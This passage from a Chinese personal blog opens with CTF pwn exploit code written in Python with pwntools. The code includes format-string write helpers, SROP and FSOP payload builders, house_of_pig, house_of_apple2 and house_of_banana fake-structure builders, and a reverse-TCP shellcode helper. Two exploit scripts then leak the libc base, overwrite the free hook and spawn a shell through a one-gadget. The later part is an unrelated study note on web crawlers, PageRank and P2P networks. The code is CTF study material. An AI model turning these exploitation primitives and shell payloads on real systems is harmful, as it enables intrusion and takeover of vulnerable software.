class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>((chain2&amp;<span class="number">0xff</span>)).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmlstr2</span>(<span class="params">offset1, offset2, chain2, target, prefix</span>): <span class="comment"># partial write</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> (target&amp;<span class="number">0xffff</span>) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hhn&quot;</span>.<span class="built_in">format</span>(((chain2&amp;<span class="number">0xff</span>) + i*<span class="number">2</span>), offset1).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">                sleep(<span class="number">0.05</span>)</span><br><span class="line">            sa(prefix, <span class="string">&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;</span>.<span class="built_in">format</span>((target&amp;<span class="number">0xffff</span>), offset2).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">0.05</span>)</span><br><span class="line">            target &gt;&gt;= <span class="number">16</span></span><br><span class="line">    sa(prefix, <span class="string">&quot;%&#123;&#125;c%8$hhn&quot;</span>.<span class="built_in">format</span>((chain2&amp;<span class="number">0xff</span>)).encode() + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SROP</span>(<span class="params">rdi, rsp, rip</span>):</span><br><span class="line">    signframe = SigreturnFrame()</span><br><span class="line">    signframe.rax = constants.SYS_execve</span><br><span class="line">    signframe.rdi = rdi</span><br><span class="line">    signframe.rsi = <span class="number">0x0</span></span><br><span class="line">    signframe.rdx = <span class="number">0x0</span></span><br><span class="line">    signframe.rsp = rsp</span><br><span class="line">    signframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(signframe)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FSOP</span>(<span class="params">fake_vtable_addr</span>):</span><br><span class="line">    <span class="comment"># only in glibc 2.23 </span></span><br><span class="line">    <span class="comment"># 2.23+ vtable有范围校验 此时不如别的打法好打</span></span><br><span class="line">    <span class="comment"># 触发方式只要能出发_IO_overflow即可(其实有关IO流的只要经过vtable应该都能打)</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0x68732f6e69622f</span> <span class="comment"># /bin/sh\x00</span></span><br><span class="line">    fake_IO_FILE.vtable = fake_vtable_addr</span><br><span class="line">    IO_FILE = <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_pig</span>(<span class="params">_IO_str_jumps, bin_addr, bin_size, system_addr</span>):</span><br><span class="line">    <span class="comment"># 2.34之前仍能用house_of_pig打，2.34之后各种hook函数被弄掉了 不过可以看看house_of_pig_plus</span></span><br><span class="line">    <span class="comment"># 原理：只要能跑到_IO_oveflow就会跳转到_IO_str_overflow然后就会malloc-&gt;memcpy-&gt;free  /||gadget</span></span><br><span class="line">    <span class="comment"># 尽量申请free_hook - 0x20然后利用_IO_save_base + _IO_backup_base来处理memcpy那部分</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line"><span class="string">    char *old_buf = fp-&gt;_IO_buf_base; # 需要控制_IO_buf_base </span></span><br><span class="line"><span class="string">	size_t old_blen = _IO_blen (fp);</span></span><br><span class="line"><span class="string">	size_t new_size = 2 * old_blen + 100;</span></span><br><span class="line"><span class="string">    new_buf = malloc (new_size); # 计算好申请出来</span></span><br><span class="line"><span class="string">    memcpy (new_buf, old_buf, old_blen); #覆盖(</span></span><br><span class="line"><span class="string">	free (old_buf);</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_str_jumps</span><br><span class="line">    fake_IO_FILE._IO_buf_base = bin_addr</span><br><span class="line">    fake_IO_FILE._IO_buf_end = bin_addr + <span class="built_in">int</span>((bin_size - <span class="number">100</span>) / <span class="number">2</span>)</span><br><span class="line">    fake_IO_FILE._IO_save_base = system_addr</span><br><span class="line">    fake_IO_FILE._IO_backup_base = system_addr</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_apple2</span>(<span class="params">_IO_wfile_jumps, wide_data_entry, wide_data_vtable_entry, RIP</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    调用流为_IO_wfile_overflow-&gt;_IO_wdoallocbuf-&gt;_IO_WDOALLOCATE-&gt;Your RIP</span></span><br><span class="line"><span class="string">    _flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为  sh;，注意前面有两个空格</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># main</span></span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> IO_FILE_plus_struct</span><br><span class="line">    fake_IO_FILE = IO_FILE_plus_struct()</span><br><span class="line">    fake_IO_FILE.flags = <span class="number">0x68732020</span></span><br><span class="line">    fake_IO_FILE._mode = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE._IO_write_ptr = <span class="number">1</span></span><br><span class="line">    fake_IO_FILE._IO_write_base = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE.vtable = _IO_wfile_jumps</span><br><span class="line">    fake_IO_FILE._wide_data = wide_data_entry</span><br><span class="line">    fake_IO_FILE._lock = wide_data_entry</span><br><span class="line">    fake_IO_FILE = <span class="built_in">bytes</span>(fake_IO_FILE)</span><br><span class="line">    <span class="comment"># wide_data 这里只要控制vtable即可</span></span><br><span class="line">    pad = p64(<span class="number">0</span>) * <span class="number">28</span></span><br><span class="line">    pad += p64(wide_data_vtable_entry)</span><br><span class="line">    <span class="comment"># wide_data_vtable</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足(B + 0x68) = C&quot;&quot;&quot;</span></span><br><span class="line">    payload = p64(RIP)*<span class="number">0x10</span></span><br><span class="line">    <span class="keyword">return</span> (fake_IO_FILE, pad, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_banana</span>(<span class="params">fake_addr, l_next, gadget, count</span>):</span><br><span class="line">    fake_content = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># l_addr keep zero to array</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(l_next) <span class="comment"># l_next # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr) <span class="comment"># l_real == _ns_loaded # check 1 for assert</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span>) <span class="comment"># check 3</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x58</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</span></span><br><span class="line">    fake_content += p64(<span class="number">0x8</span> * count) <span class="comment"># gadgets count * 8 # l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span></span><br><span class="line">    fake_content += gadget <span class="comment"># reverse_gadget</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x110</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_content += p64(fake_addr + <span class="number">0x40</span>) <span class="comment"># l-&gt;l_info[DT_FINI_ARRAY]</span></span><br><span class="line">    fake_content += p64(<span class="number">0</span>) + p64(fake_addr + <span class="number">0x48</span>) <span class="comment">#l-&gt;l_info[DT_FINI_ARRAYSZ]</span></span><br><span class="line">    fake_content = fake_content.ljust(<span class="number">0x31c</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># 0x31c / 0x314</span></span><br><span class="line">    fake_content += p64(<span class="number">0x1c</span>) <span class="comment"># check 2 to l_init_called</span></span><br><span class="line">    <span class="keyword">return</span> fake_content</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;pwncli&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_tcp</span>():</span><br><span class="line">    <span class="keyword">from</span> pwncli <span class="keyword">import</span> ShellcodeMall</span><br><span class="line">    reverse_tcp = ShellcodeMall.amd64.reverse_tcp_connect(ip=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">10001</span>)</span><br><span class="line">    <span class="keyword">return</span> reverse_tcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import CurrentGadgets, gift</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">gift[&#x27;elf&#x27;] = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="string">gift[&#x27;libc&#x27;] = ELF()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pop_rdi_ret = CurrentGadgets.pop_rdi_ret()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">execve_chain = CurrentGadgets.execve_chain(bin_sh_addr=0x11223344)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc search</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import LibcBox</span></span><br><span class="line"><span class="string">libc_box = LibcBox()</span></span><br><span class="line"><span class="string">libc_box.add_symbol(&quot;system&quot;, 0x640)</span></span><br><span class="line"><span class="string">libc_box.add_symbol(&quot;puts&quot;, 0x810)</span></span><br><span class="line"><span class="string">libc_box.search(download_symbols=False, download_so=False, download_deb=True) # 是否下载到本地</span></span><br><span class="line"><span class="string">read_offset = libc_box.dump(&quot;read&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># onegadgets</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">from pwncli import get_current_one_gadget_from_libc</span></span><br><span class="line"><span class="string"># 获取当前装载的libc的gadget</span></span><br><span class="line"><span class="string">all_ogs = get_current_one_gadget_from_libc()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="string">b&quot;&#123;&#125;[]&#123;&#125;&#123;[*&#123;&quot;</span> + <span class="string">b&#x27;(&#x27;</span>*<span class="number">0x64</span> + <span class="string">b&#x27;&#123;&#x27;</span> + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bpp()</span></span><br><span class="line">sl(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sl(&quot;A&quot;)</span></span><br><span class="line">sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">rl()</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>*<span class="number">0x401</span>)</span><br><span class="line">rl()</span><br><span class="line">sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_libc = <span class="built_in">int</span>(rl().decode())</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"></span><br><span class="line">libc_base = leak_libc - (<span class="number">0x7fa05e7c4b98</span> - <span class="number">0x7fa05e400000</span>)</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># global_max_fast = libc_base + (0x7fbe419c67f8 - 0x7fbe41600000)</span></span><br><span class="line"><span class="comment"># log(hex(global_max_fast))</span></span><br><span class="line"><span class="comment"># s(p64(global_max_fast))</span></span><br><span class="line"></span><br><span class="line">IO_buf_base = libc_base + (<span class="number">0x7f8fd4dc4918</span> - <span class="number">0x7f8fd4a00000</span>)</span><br><span class="line">s(p64(IO_buf_base))</span><br><span class="line"></span><br><span class="line">key = libc_base + (<span class="number">0x7f40dbdc4963</span> - <span class="number">0x7f40dba00000</span>)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sl((p64(key)*<span class="number">3</span> + p64(malloc_hook) + p64(malloc_hook+<span class="number">0x20</span>) + p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>) + <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">onegadgets = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(p64(libc_base + onegadgets[<span class="number">1</span>])*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sl(&#x27;A&#x27;)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://blog.gdb.wiki/2019/11/24/CTF-scanf%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/#%E5%89%8D%E8%A8%80%EF%BC%9A%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%BE%80%E5%BE%80%E4%BC%9A%E9%81%87%E5%88%B0%E5%BE%88%E5%A4%9A%E9%9B%B6%E6%95%A3%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%AF%B9%E8%A7%A3%E9%A2%98%E6%9C%89%E5%8D%81%E5%88%86%E5%A4%A7%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%8C%E6%89%80%E4%BB%A5%E5%86%99%E4%B8%80%E4%B8%AA%E6%96%87%E7%AB%A0%E6%9D%A5%E5%B7%A9%E5%9B%BA%E4%B8%80%E4%B8%8B">http://blog.gdb.wiki/2019/11/24/CTF-scanf相关的漏洞详解/#前言：比赛中往往会遇到很多零散的漏洞，对解题有十分大的作用，所以写一个文章来巩固一下</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pad = <span class="string">b&quot;&#123;&#125;[]&#123;&#125;[&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">bpp()</span><br><span class="line">sl(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sl(&quot;A&quot;)</span></span><br><span class="line">sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line">rl()</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>*<span class="number">0x401</span>)</span><br><span class="line">rl()</span><br><span class="line">sl(<span class="string">&quot;+&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_libc = <span class="built_in">int</span>(rl().decode())</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"></span><br><span class="line">libc_base = leak_libc - (<span class="number">0x7fa05e7c4b98</span> - <span class="number">0x7fa05e400000</span>)</span><br><span class="line"></span><br><span class="line">log(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>*<span class="number">0x401</span>)</span><br><span class="line"><span class="comment"># sl(&quot;+&quot;)</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/106694651">https://blog.csdn.net/seaaseesa/article/details/106694651</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/26/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.png">
      <meta itemprop="name" content="hkbin">
      <meta itemprop="description" content="hkbin hkbin hkbin">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hkbin的小博客~">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/26/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96/" class="post-title-link" itemprop="url">网络信息获取之主动获取</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-26 21:09:32 / 修改时间：21:11:34" itemprop="dateCreated datePublished" datetime="2023-11-26T21:09:32+08:00">2023-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1>网络信息获取之主动获取</h1>
<p>Created: November 26, 2023 4:16 PM<br>
Reviewed: No</p>
<h1>网络信息搜索系统的一般结构</h1>
<p>搜索器、索引器、检索器、用户接口</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled.png" alt="Untitled"></p>
<h2 id="搜索器-爬虫">搜索器(爬虫)</h2>
<p>功能是在互联网中漫游，发现和收集信息。要尽可能多、尽可能快地搜集各种类型地新信息，还需要定期更新旧信息，避免死链接和无效链接。</p>
<h3 id="爬虫的分类">爬虫的分类</h3>
<ol>
<li class="lvl-3">
<p>批量型爬虫：批量型爬虫有明确的抓取范围和目标，当爬虫达到这个设定的目标后，即停止抓取过程。</p>
</li>
<li class="lvl-3">
<p>增量型爬虫：增量型爬虫会持续不断地抓取，对于抓取的网页可以实现定期更新，通用的商业搜索引擎爬虫基本属于此类。</p>
</li>
<li class="lvl-3">
<p>垂直型爬虫(聚焦爬虫)：垂直型爬虫关注特定主题或属于特定行业的网页，其他主题或其他行业的内容不在考虑范围之内。</p>
</li>
</ol>
<h3 id="主要技术">主要技术</h3>
<p>爬虫缓冲池：抓取种子url放入队列中，取出URL，抓取页面并将URL放入已抓取队列，分析已抓取URL队列中的URL得到新URL，进入下一个循环。</p>
<h3 id="在爬虫角度上的互联网划分">在爬虫角度上的互联网划分</h3>
<ol>
<li class="lvl-3">
<p>已下载未过期页面</p>
</li>
<li class="lvl-3">
<p>已下载已过期页面</p>
</li>
<li class="lvl-3">
<p>待下载页面</p>
</li>
<li class="lvl-3">
<p>可知页面</p>
</li>
<li class="lvl-3">
<p>不可知网页</p>
</li>
</ol>
<h2 id="网络搜索策略">网络搜索策略</h2>
<h3 id="深度优先">深度优先</h3>
<p>深度优先遍历策略指网络爬虫会从起始页开始，一个链接一个链接地追踪下去，完整地处理完一条路之后再转入下一个起始页。多数情况下会导致爬虫的trapped问题。</p>
<h3 id="广度优先">广度优先</h3>
<p>也就是通用爬虫的思路(</p>
<p>缺点是大量的无关页面将被下载并过滤，算法的效率会降低。</p>
<h3 id="最佳优先">最佳优先</h3>
<p>在抓取地过程中，按照一定的页面分析算法，预测候选的URL和目标网页地相似度，或者与主题地相关性，选取评价最好的一个或者几个URL进行抓取。</p>
<p>缺点是在爬虫抓取路径上的很多相关网页可能被忽略，因为最佳优先策略是一种局部最有搜索算法。</p>
<p>这样的闭环调整可以将无关页面数量降低30%~90%</p>
<h2 id="多机抓取算法和单机抓取算法">多机抓取算法和单机抓取算法</h2>
<p>多级抓取算法可以理解为多了一个调度器，用来统一分配URL，下面的都是它的线程/肉鸡，思路都一样，分配的时候n = hash(url) mod N，分配给N节点。</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%201.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%202.png" alt="Untitled"></p>
<h2 id="索引器">索引器</h2>
<p>索引器的功能是<strong>理解搜索器所搜索的信息，从中抽取出索引项，用于表示文档以及生成文档库的索引表</strong>。</p>
<h3 id="评价网站好坏→PageRank算法">评价网站好坏→PageRank算法</h3>
<p>PageRank根据网站的外部链接和内部链接的数量和质量衡量网站的价值。</p>
<p>示例：</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%203.png" alt="Untitled"></p>
<p><strong>中心思想</strong></p>
<p>数量假设：</p>
<p>当在网页模型图中，一个网页接受到的其他网页指向的入链(in-links)越多，说明该网页越重要。</p>
<p>质量假设：</p>
<p>当一个质量高的网页指向(out-links)一个网页，说明这个被指的网页重要。</p>
<p><strong>公式：</strong></p>
<p>$$<br>
PR(v_i) = \sum_{v_j\in M(v_i)}\frac {PR(j)}{L(v_j)}, i=1,2,…,n<br>
$$</p>
<p>其中M(vi)表示指向节点vi的节点集合。</p>
<p>L(vj)表示节点vj连出的有向边个数。</p>
<p>例题：</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%204.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%205.png" alt="Untitled"></p>
<p>上述只是迭代了第一次。需要一直迭代直到极限。</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%206.png" alt="Untitled"></p>
<h3 id="Dead-Ends问题">Dead Ends问题</h3>
<p>当一个节点没有任何出链，这就是Dead Links，它会导致网站权重变为0</p>
<p>一直迭代下去会导致所有节点的PR值为0</p>
<p>例如：</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%207.png" alt="Untitled"></p>
<p>这个时候需要一个修正：</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%208.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%209.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2010.png" alt="Untitled"></p>
<h3 id="Spider-Traps问题">Spider Traps问题</h3>
<p>这个问题出现在于有节点指向自己，PageRank算法迭代下去会发现，该节点的PR值为1，别的节点为0。</p>
<p>修正方式：</p>
<p>随机游走，也就是打开网页B的时候，有概率打开网页C/D。</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2011.png" alt="Untitled"></p>
<h2 id="检索器">检索器</h2>
<p>检索器的功能是根据用户的查询在索引库中快速检出文档，进行文档与查询的相关度评价，对将要输出的结果进行排序，并实现某种用户相关性反馈机制。</p>
<p>检索器常用的四种模型有集合理论模型，代数模型，概率模型和混合模型四种。</p>
<h2 id="用户接口">用户接口</h2>
<p>用户接口的作用是输入用户查询，显示查询结果，提供用户相关性反馈机制，主要的目的是方便用户使用搜索引擎，高效率、多方式地从搜索引擎得到有效、及时地信息。</p>
<h1>主被动获取技术比较</h1>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2012.png" alt="Untitled"></p>
<h1>P2P网络</h1>
<h2 id="P2P系统的分类">P2P系统的分类</h2>
<h3 id="基于目录服务器地P2P网络-集中式">基于目录服务器地P2P网络(集中式)</h3>
<p>三张图理解</p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2013.png" alt="Untitled"></p>
<p><img src="./images/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E4%B9%8B%E4%B8%BB%E5%8A%A8%E8%8E%B7%E5%8F%96%20b98f42b8c3b048f786cf7acef56bf4db/Untitled%2014.png" alt="Untitled"></p>
